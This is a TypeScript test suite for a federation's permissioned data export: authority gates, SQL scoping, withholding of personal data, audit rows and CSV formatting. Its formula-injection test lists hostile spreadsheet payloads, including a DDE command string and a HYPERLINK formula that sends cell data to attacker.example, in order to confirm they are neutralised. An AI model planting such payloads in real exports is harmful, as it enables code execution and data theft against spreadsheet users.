// Permissioned data export, against real Postgres.
//
// The invariants here are not "a file comes out". They are: an export refuses
// without BOTH the run authority and the read authority; the scope narrowing is
// a SQL predicate and not a filter over rows already fetched; a kind that
// cannot be scoped refuses a scoped caller rather than handing them an empty
// file; personal columns need the action that says so; every export leaves an
// audit row that names who, what, how many and which filters; and a CSV cannot
// carry a formula into a spreadsheet.

import { describe, it, expect, beforeAll } from 'vitest';
import { readFileSync, readdirSync } from 'node:fs';
import { PGlite } from '@electric-sql/pglite';
import { drizzle } from 'drizzle-orm/pglite';
import { desc, eq } from 'drizzle-orm';
import * as s from '../src/db/schema';
import {
  runExport, csvField, toCsv, availableKinds, allKindIds,
  ExportError, MAX_ROW_LIMIT, UTF8_BOM,
  type ExportColumn,
} from '../src/lib/export';
import { ForbiddenError, type Principal } from '../src/lib/rbac';

let db: any;
let STATE_A: number, STATE_B: number, DOJO_A: number, DOJO_B: number;

// ── Principals ──────────────────────────────────────────────────────────────
//
// Note what is NOT here: a STATE_ADMIN holding export:run. No scoped role in
// GRANTS holds it today, so the scope predicate is exercised through principals
// assembled from roles that do — which is the point of testing the predicate
// rather than the current role table, since the role table is what changes.

const federationAdmin: Principal = {
  userId: 1, label: 'federation-admin',
  bindings: [{ role: 'FEDERATION_ADMIN', scopeType: 'national', scopeId: null }],
};

/** Holds export:run and audit:read nationally, and nothing that writes. */
const auditor: Principal = {
  userId: 2, label: 'auditor',
  bindings: [{ role: 'AUDITOR', scopeType: 'national', scopeId: null }],
};

/** Holds person:read and membership:read, but NOT export:run. */
const instructor: Principal = {
  userId: 3, label: 'instructor',
  bindings: [{ role: 'INSTRUCTOR', scopeType: 'national', scopeId: null }],
};

/** An AUDITOR bound to one state: export:run and every read, in that state only. */
let stateAuditor: Principal;
/** The same authority, bound to a single dojo. */
let dojoAuditor: Principal;

const ctxOf = (principal: Principal) => ({ principal, ip: '203.0.113.9', reason: 'test export' });

async function auditRows() {
  return db.select().from(s.auditEvents)
    .where(eq(s.auditEvents.entityType, 'export'))
    .orderBy(desc(s.auditEvents.id));
}

async function textOf(result: { body: Iterable<string> }): Promise<string> {
  let out = '';
  for (const chunk of result.body) out += chunk;
  return out;
}

beforeAll(async () => {
  const client = new PGlite();
  db = drizzle(client, { schema: s });
  for (const f of readdirSync('drizzle').filter((x) => x.endsWith('.sql')).sort()) {
    for (const st of readFileSync(`drizzle/${f}`, 'utf8').split('--> statement-breakpoint')) {
      if (st.trim()) await client.exec(st.trim());
    }
  }

  const [a] = await db.insert(s.stateUnits)
    .values({ code: 'ST-A', state: 'State A', name: 'Unit A', status: 'active' })
    .returning({ id: s.stateUnits.id });
  STATE_A = a.id;
  const [b] = await db.insert(s.stateUnits)
    .values({ code: 'ST-B', state: 'State B', name: 'Unit B', status: 'active' })
    .returning({ id: s.stateUnits.id });
  STATE_B = b.id;

  const [d1] = await db.insert(s.dojos)
    .values({ code: 'DJ-A1', name: 'Dojo A1', stateUnitId: STATE_A, status: 'active' })
    .returning({ id: s.dojos.id });
  DOJO_A = d1.id;
  const [d2] = await db.insert(s.dojos)
    .values({ code: 'DJ-B1', name: 'Dojo B1', stateUnitId: STATE_B, status: 'active' })
    .returning({ id: s.dojos.id });
  DOJO_B = d2.id;

  // Fixture people. These are test rows in a test database, named as test rows.
  await db.insert(s.persons).values([
    { federationId: 'TEST-0001', fullName: 'Row One', stateUnitId: STATE_A, dojoId: DOJO_A, email: 'one@example.test', phone: '0000000001', status: 'active' },
    { federationId: 'TEST-0002', fullName: 'Row Two', stateUnitId: STATE_A, dojoId: DOJO_A, email: 'two@example.test', phone: '0000000002', status: 'active' },
    { federationId: 'TEST-0003', fullName: 'Row Three', stateUnitId: STATE_B, dojoId: DOJO_B, email: 'three@example.test', phone: '0000000003', status: 'pending' },
  ]);

  stateAuditor = {
    userId: 4, label: 'state-auditor',
    bindings: [{ role: 'AUDITOR', scopeType: 'state', scopeId: STATE_A }],
  };
  dojoAuditor = {
    userId: 5, label: 'dojo-auditor',
    bindings: [{ role: 'AUDITOR', scopeType: 'dojo', scopeId: DOJO_B }],
  };
});

// ───────────────────────────────────────────────────────────────────────────

describe('both gates, separately', () => {
  it('refuses a caller who may read the records but holds no export authority', async () => {
    // An INSTRUCTOR holds person:read. Reading a register on screen and taking
    // it away as a file are different authorities, and this is the difference.
    await expect(
      runExport(db, ctxOf(instructor), { kind: 'persons', format: 'csv' })
    ).rejects.toThrow(ForbiddenError);
  });

  it('refuses a caller who holds export:run but not the kind’s read action', async () => {
    // A SUPPORT_AGENT-shaped principal: export:run without finance:read.
    const supportAgent: Principal = {
      userId: 9, label: 'support',
      bindings: [{ role: 'SUPPORT_AGENT', scopeType: 'national', scopeId: null }],
    };
    await expect(
      runExport(db, ctxOf(supportAgent), { kind: 'orders', format: 'csv' })
    ).rejects.toThrow(ForbiddenError);
  });

  it('allows a caller holding both, and writes nothing to the log for a refusal', async () => {
    const before = (await auditRows()).length;
    await expect(
      runExport(db, ctxOf(instructor), { kind: 'persons', format: 'csv' })
    ).rejects.toThrow(ForbiddenError);
    expect((await auditRows()).length).toBe(before);

    const ok = await runExport(db, ctxOf(federationAdmin), { kind: 'persons', format: 'csv' });
    expect(ok.rowsReturned).toBe(3);
  });
});

describe('scope is a SQL predicate, not a filter over fetched rows', () => {
  it('a state-bound holder gets their own state and is told so by the counts', async () => {
    const all = await runExport(db, ctxOf(auditor), { kind: 'persons', format: 'json' });
    expect(all.rowsMatched).toBe(3);

    const mine = await runExport(db, ctxOf(stateAuditor), { kind: 'persons', format: 'json' });
    // rowsMatched is produced by the SAME predicate as the read. If scoping were
    // applied after the query, the count would still say 3 — so this assertion
    // is the one that catches a filter-after-the-fact implementation.
    expect(mine.rowsMatched).toBe(2);
    expect(mine.rowsReturned).toBe(2);

    const text = await textOf(mine);
    expect(text).toContain('TEST-0001');
    expect(text).toContain('TEST-0002');
    expect(text).not.toContain('TEST-0003');
  });

  it('a dojo-bound holder gets their own dojo', async () => {
    const mine = await runExport(db, ctxOf(dojoAuditor), { kind: 'persons', format: 'json' });
    expect(mine.rowsMatched).toBe(1);
    expect(await textOf(mine)).toContain('TEST-0003');
  });

  it('scopes through a join where the row itself carries no state', async () => {
    // A membership row has no state column. If the join were dropped, this
    // would return every membership to a state-bound caller.
    const [p] = await db.select({ id: s.persons.id }).from(s.persons)
      .where(eq(s.persons.federationId, 'TEST-0003'));
    await db.insert(s.memberships).values({
      personId: p.id, category: 'athlete', validFrom: '2026-01-01', status: 'active',
    });

    const otherState = await runExport(db, ctxOf(stateAuditor), { kind: 'memberships', format: 'json' });
    expect(otherState.rowsMatched).toBe(0);

    const ownState = await runExport(db, ctxOf(dojoAuditor), { kind: 'memberships', format: 'json' });
    expect(ownState.rowsMatched).toBe(1);
  });
});

describe('a kind that cannot be scoped refuses rather than returning an empty file', () => {
  it('audit-events is national only, and says why', async () => {
    // The failure this prevents: a scoped compliance officer exports the audit
    // log, receives a valid file with no rows, and reports that nothing
    // happened. Refusing is the only answer that is not misleading.
    await expect(
      runExport(db, ctxOf(stateAuditor), { kind: 'audit-events', format: 'csv' })
    ).rejects.toMatchObject({ code: 'national_only' });

    const national = await runExport(db, ctxOf(auditor), { kind: 'audit-events', format: 'csv' });
    expect(national.rowsMatched).toBeGreaterThan(0);
  });

  it('never exports the actor IP hash', async () => {
    const result = await runExport(db, ctxOf(auditor), { kind: 'audit-events', format: 'csv' });
    expect(result.columns).not.toContain('actor_ip_hash');
    expect(await textOf(result)).not.toContain('actor_ip_hash');
  });
});

describe('personal columns need the action that says so', () => {
  it('omits dob, e-mail and telephone from a caller without person:read_pii', async () => {
    // An AUDITOR holds person:read and NOT person:read_pii, which is exactly
    // the shape this distinction exists for: read the register, not the people.
    const reduced = await runExport(db, ctxOf(auditor), { kind: 'persons', format: 'csv' });
    expect(reduced.columns).toContain('full_name');
    expect(reduced.columns).not.toContain('email');
    expect(reduced.columns).not.toContain('dob');
    expect(await textOf(reduced)).not.toContain('one@example.test');

    const full = await runExport(db, ctxOf(federationAdmin), { kind: 'persons', format: 'csv' });
    expect(full.columns).toContain('email');
    expect(await textOf(full)).toContain('one@example.test');
  });

  it('withholds them when the caller holds the action in a NARROWER scope than the file', async () => {
    // Constructible from the role table as it stands, and the reason this test
    // exists: TRAINING_DIRECTOR bound nationally holds export:run and
    // person:read; COACH_MANAGER bound to one state holds person:read_pii.
    // Asking canAnywhere() alone returns true, and the answer is a national
    // register carrying dates of birth and telephone numbers, from an authority
    // granted over a single state.
    const wideReadNarrowPii: Principal = {
      userId: 6, label: 'director-and-coach-manager',
      bindings: [
        { role: 'TRAINING_DIRECTOR', scopeType: 'national', scopeId: null },
        { role: 'COACH_MANAGER', scopeType: 'state', scopeId: STATE_A },
      ],
    };

    const result = await runExport(db, ctxOf(wideReadNarrowPii), { kind: 'persons', format: 'csv' });
    // The rows are theirs — the columns are not. Withholding the columns rather
    // than dropping rows keeps the file honest about how many people there are.
    expect(result.rowsReturned).toBe(3);
    expect(result.columns).toContain('full_name');
    expect(result.columns).not.toContain('email');
    expect(result.columns).not.toContain('dob');
    expect(await textOf(result)).not.toContain('one@example.test');
  });

  it('keeps them when the file sits inside the scope the action was granted in', async () => {
    // The same two roles, both bound to the same state. Nothing leaves the
    // scope the personal-data authority was given over, so the columns travel.
    const bothInOneState: Principal = {
      userId: 7, label: 'state-auditor-and-coach-manager',
      bindings: [
        { role: 'AUDITOR', scopeType: 'state', scopeId: STATE_A },
        { role: 'COACH_MANAGER', scopeType: 'state', scopeId: STATE_A },
      ],
    };

    const result = await runExport(db, ctxOf(bothInOneState), { kind: 'persons', format: 'csv' });
    expect(result.rowsReturned).toBe(2);
    expect(result.columns).toContain('email');
    expect(await textOf(result)).toContain('one@example.test');
  });
});

describe('every export is logged', () => {
  it('records who, what kind, how many rows, which filters and which columns', async () => {
    const before = (await auditRows()).length;
    const result = await runExport(db, ctxOf(federationAdmin), {
      kind: 'persons', format: 'csv', filters: { status: ['active'] }, limit: 1,
    });

    const rows = await auditRows();
    expect(rows.length).toBe(before + 1);

    const entry = rows[0];
    expect(entry.action).toBe('export');
    expect(entry.entityType).toBe('export');
    expect(entry.entityId).toBe('persons');
    expect(entry.actorLabel).toBe('federation-admin');
    expect(entry.actorUserId).toBe(1);
    // The raw IP is never stored, only a hash of it.
    expect(entry.actorIpHash).not.toBe('203.0.113.9');
    expect(entry.actorIpHash).toBeTruthy();

    expect(entry.newValue).toMatchObject({
      kind: 'persons',
      format: 'csv',
      rowsReturned: result.rowsReturned,
      rowsMatched: result.rowsMatched,
      truncated: true,
      limit: 1,
      filters: { status: ['active'] },
      includedPersonalData: true,
    });
    expect(entry.newValue.columns).toContain('email');
  });

  it('logs the reduced column set when personal data did not leave', async () => {
    await runExport(db, ctxOf(auditor), { kind: 'persons', format: 'json' });
    const entry = (await auditRows())[0];
    expect(entry.newValue.includedPersonalData).toBe(false);
    expect(entry.newValue.columns).not.toContain('email');
  });
});

describe('the row cap is reported, not hidden', () => {
  it('returns fewer rows than matched and says so', async () => {
    const result = await runExport(db, ctxOf(federationAdmin), { kind: 'persons', format: 'json', limit: 1 });
    expect(result.rowsReturned).toBe(1);
    expect(result.rowsMatched).toBe(3);
    expect(result.truncated).toBe(true);

    const envelope = JSON.parse(await textOf(result));
    expect(envelope.rowsReturned).toBe(1);
    expect(envelope.rowsMatched).toBe(3);
    expect(envelope.truncated).toBe(true);
  });

  it('clamps a request for more than the hard cap', async () => {
    const result = await runExport(db, ctxOf(federationAdmin), {
      kind: 'persons', format: 'json', limit: 10_000_000,
    });
    expect(result.limit).toBe(MAX_ROW_LIMIT);
  });
});

describe('filters', () => {
  it('refuses a status the column does not have, and names the ones it does', async () => {
    await expect(
      runExport(db, ctxOf(federationAdmin), { kind: 'persons', format: 'csv', filters: { status: ['nonsense'] } })
    ).rejects.toMatchObject({ code: 'bad_filter' });
  });

  it('refuses a malformed date rather than passing it to the database', async () => {
    await expect(
      runExport(db, ctxOf(federationAdmin), { kind: 'persons', format: 'csv', filters: { from: '14/08/2026' } })
    ).rejects.toMatchObject({ code: 'bad_filter' });
  });

  it('includes rows recorded on the closing day of the window', async () => {
    // The off-by-one this guards: `created_at <= '<today>'` on a timestamp
    // column means midnight, so every row written today would be dropped and
    // the file would still look plausible.
    const today = new Date().toISOString().slice(0, 10);
    const result = await runExport(db, ctxOf(federationAdmin), {
      kind: 'persons', format: 'json', filters: { from: today, to: today },
    });
    expect(result.rowsMatched).toBe(3);
  });
});

describe('CSV correctness', () => {
  const col = (key: string, over: Partial<ExportColumn> = {}): ExportColumn =>
    ({ key, header: key, col: null, ...over });

  it('escapes quotes, commas and newlines', () => {
    expect(csvField('plain')).toBe('plain');
    expect(csvField('a,b')).toBe('"a,b"');
    expect(csvField('say "yes"')).toBe('"say ""yes"""');
    expect(csvField('line one\nline two')).toBe('"line one\nline two"');
    // A carriage return mid-field is quoted, not neutralised: the trigger is
    // only a trigger at the START of a cell.
    expect(csvField('carriage\rreturn')).toBe('"carriage\rreturn"');
    expect(csvField('\rSUM(A1)')).toBe('"\'\rSUM(A1)"');
  });

  it('neutralises a formula injection', () => {
    // The attack: a field beginning with one of these is EVALUATED by Excel,
    // LibreOffice and Sheets. The federation takes enquiries through public
    // forms, so a stranger chooses the first character of a cell in a file an
    // administrator opens.
    for (const payload of [
      '=1+1',
      '+1+1',
      '-1+1',
      '@SUM(A1)',
      '=cmd|\' /C calc\'!A0',
      '=HYPERLINK("https://attacker.example/?"&A1,"Click")',
    ]) {
      const out = csvField(payload);
      expect(out.startsWith('"\'')).toBe(true);
      // Neutralised, not deleted: the original text is still readable.
      expect(out).toContain(payload.replace(/"/g, '""'));
    }
  });

  it('leaves a negative number alone — it is not a formula', () => {
    // A discount of -500 paise must not become '-500. Numbers this module
    // formatted are never run through the text neutralisation.
    const csv = toCsv([col('amount', { money: true })], [{ amount: -500 }]);
    expect(csv).toContain('\r\n-500\r\n');
  });

  it('begins with the UTF-8 BOM so Excel reads Indian names correctly', () => {
    const csv = toCsv([col('name')], [{ name: 'नाम' }]);
    expect(csv.startsWith(UTF8_BOM)).toBe(true);
    expect(csv).toContain('नाम');
  });

  it('uses CRLF, per RFC 4180', () => {
    const csv = toCsv([col('a')], [{ a: '1' }, { a: '2' }]);
    expect(csv).toBe(`${UTF8_BOM}a\r\n1\r\n2\r\n`);
  });

  it('writes dates in ISO 8601', () => {
    const csv = toCsv([col('at')], [{ at: new Date('2026-08-14T06:30:00Z') }]);
    expect(csv).toContain('2026-08-14T06:30:00.000Z');
  });

  it('writes money as the integer minor units it is stored as', async () => {
    const csv = toCsv([col('total', { header: 'total (paise)', money: true })], [{ total: 123456 }]);
    // Not 1234.56. The unit is in the header instead.
    expect(csv).toContain('total (paise)');
    expect(csv).toContain('123456');
    expect(csv).not.toContain('1234.56');
  });

  it('refuses to write a fractional amount as money rather than rounding it', () => {
    expect(() => toCsv([col('total', { money: true })], [{ total: 12.5 }]))
      .toThrow(ExportError);
  });

  it('a blank cell is blank, not the word null', () => {
    const csv = toCsv([col('a')], [{ a: null }, { a: undefined }]);
    expect(csv).toBe(`${UTF8_BOM}a\r\n\r\n\r\n`);
  });
});

describe('the kind catalogue', () => {
  it('offers a caller only the kinds their own authority reaches', () => {
    expect(availableKinds(instructor)).toEqual([]);          // no export:run at all
    const forAuditor = availableKinds(auditor).map((k) => k.id);
    expect(forAuditor).toContain('persons');
    expect(forAuditor).toContain('audit-events');

    const forAdmin = availableKinds(federationAdmin).map((k) => k.id);
    // A FEDERATION_ADMIN holds audit:read as well, so this is not a difference
    // of catalogue — the difference between the two is in the COLUMNS.
    expect(forAdmin).toEqual(expect.arrayContaining(forAuditor));
  });

  it('refuses an unknown kind by name', async () => {
    await expect(
      runExport(db, ctxOf(federationAdmin), { kind: 'everything', format: 'csv' })
    ).rejects.toMatchObject({ code: 'unknown_kind' });
  });

  it('refuses a format that is not built', async () => {
    // XLSX and PDF need a library and are not implemented. A caller asking for
    // one is told so rather than handed a CSV with the wrong extension.
    for (const format of ['xlsx', 'pdf', 'html']) {
      await expect(
        runExport(db, ctxOf(federationAdmin), { kind: 'persons', format: format as any })
      ).rejects.toMatchObject({ code: 'unsupported_format' });
    }
  });

  it('every kind is reachable through runExport and nothing else', () => {
    // If a kind were added with its own query path, this list and the module's
    // single code path would drift. There is one path; this asserts the
    // catalogue is non-empty so an empty registry cannot pass silently.
    expect(allKindIds().length).toBeGreaterThan(0);
    expect(new Set(allKindIds()).size).toBe(allKindIds().length);
  });
});
